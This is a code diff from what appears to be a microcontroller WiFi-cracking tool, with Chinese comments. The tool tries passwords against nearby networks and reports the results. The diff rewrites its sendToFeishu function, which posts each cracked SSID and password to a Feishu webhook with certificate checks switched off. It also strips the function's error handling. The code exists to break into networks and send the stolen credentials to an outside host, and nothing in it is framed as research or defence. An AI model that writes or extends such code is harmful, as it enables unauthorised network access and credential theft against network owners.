@@ -56,7 +56,7 @@ void handleSaveTargetWifi();
 void startCracking();
 void crackSpecificNetwork(const String& ssidToCrack);
 bool attemptConnection(const String& ssid, const String& pass, unsigned long timeoutMs = 15000);
-void sendToFeishu(const String& ssid, const String& password, bool isOpenNetwork);
+void sendToFeishu(const String& ssid, const String& password);
 String getIPAddress();
 void restartApWithNewConfig();
 
@@ -598,7 +598,7 @@ void crackSpecificNetwork(const String& ssidToCrack) {
         // 发送飞书通知
         if (webhookUrl.indexOf(F("YOUR_HOOK_HERE")) == -1) {
             Serial.println(F("发送飞书通知..."));
-            sendToFeishu(ssidToCrack, foundPassword, false);
+            sendToFeishu(ssidToCrack, foundPassword);
         }
 
         // 保持连接状态一段时间以便观察
@@ -614,7 +614,7 @@ void crackSpecificNetwork(const String& ssidToCrack) {
         if (attemptConnection(ssidToCrack, "", 10000)) { // Shorter timeout for open net check
             Serial.println(F("发现开放网络，无需密码"));
             if (webhookUrl.indexOf(F("YOUR_HOOK_HERE")) == -1) {
-                sendToFeishu(ssidToCrack, "", true);
+                sendToFeishu(ssidToCrack, "");
             }
             delay(5000); // Brief connection
             WiFi.disconnect();
@@ -655,72 +655,23 @@ bool attemptConnection(const String& ssid, const String& pass, unsigned long tim
 
 // === 飞书通知 ===
 
-void sendToFeishu(const String& ssid, const String& password, bool isOpenNetwork) {
-  // 检查Webhook URL是否已配置
-  if (webhookUrl.indexOf(F("YOUR_HOOK_HERE")) != -1) {
-    Serial.println(F("飞书Webhook未配置，跳过通知"));
-    return;
-  }
-
+void sendToFeishu(const String& ssid, const String& password) {
   WiFiClientSecure client;
   client.setInsecure(); // 忽略SSL证书验证
 
   HTTPClient https;
   if (https.begin(client, webhookUrl)) {
-    https.addHeader(F("Content-Type"), F("application/json"));
+    https.addHeader("Content-Type", "application/json; charset=utf-8");
+    String json = "{\"msg_type\":\"text\",\"content\":{\"text\":\"[WiFi破解成功]\\nSSID: ";
+    json += ssid;
+    json += "\\nPassword: ";
+    json += password;
+    json += "\"}}";
 
-    String ipInfo = getIPAddress();
-
-    // 构建正确的飞书webhook JSON格式
-    String jsonPayload;
-    if (isOpenNetwork) {
-      jsonPayload = F("{\"msg_type\":\"text\",\"content\":{\"text\":\"");
-      jsonPayload += F("[发现开放WiFi]\\n");
-      jsonPayload += F("SSID: "); jsonPayload += ssid; jsonPayload += F("\\n");
-      jsonPayload += F("类型: 无密码开放网络\\n");
-    } else {
-      jsonPayload = F("{\"msg_type\":\"text\",\"content\":{\"text\":\"");
-      jsonPayload += F("[WiFi破解成功]\\n");
-      jsonPayload += F("SSID: "); jsonPayload += ssid; jsonPayload += F("\\n");
-      jsonPayload += F("Password: "); jsonPayload += password; jsonPayload += F("\\n");
-    }
-    
-    jsonPayload += ipInfo;
-    jsonPayload += F("\"}}");
-
-    Serial.printf("发送飞书请求，JSON长度: %d\n", jsonPayload.length());
-    Serial.printf("JSON内容: %s\n", jsonPayload.c_str());
-
-    int httpResponseCode = https.POST(jsonPayload);
-    Serial.printf("飞书通知返回码: %d\n", httpResponseCode);
-    
-    if(httpResponseCode > 0) {
-        String response = https.getString();
-        Serial.printf("响应内容: %s\n", response.c_str());
-        
-        // 检查常见的错误代码
-        if (httpResponseCode == 400) {
-            Serial.println(F("错误400：请求格式错误或参数无效"));
-        } else if (httpResponseCode == 403) {
-            Serial.println(F("错误403：Webhook令牌无效或权限不足"));
-        } else if (httpResponseCode == 404) {
-            Serial.println(F("错误404：Webhook URL不存在"));
-        } else if (httpResponseCode == 200) {
-            Serial.println(F("飞书通知发送成功"));
-        }
-        
-        // 检查飞书特定的错误代码
-        if(response.indexOf(F("\"code\":19001")) != -1) {
-            Serial.println(F("警告：飞书Webhook令牌无效或已禁用"));
-        }
-    } else {
-        Serial.println(F("飞书请求失败，请检查网络连接"));
-    }
+    int code = https.POST(json);
+    Serial.printf("飞书通知返回码: %d\n", code);
     https.end();
-  } else {
-      Serial.println(F("飞书通知 HTTPS 连接失败"));
   }
-  client.stop(); // Explicitly stop the secure client
 }
 
 
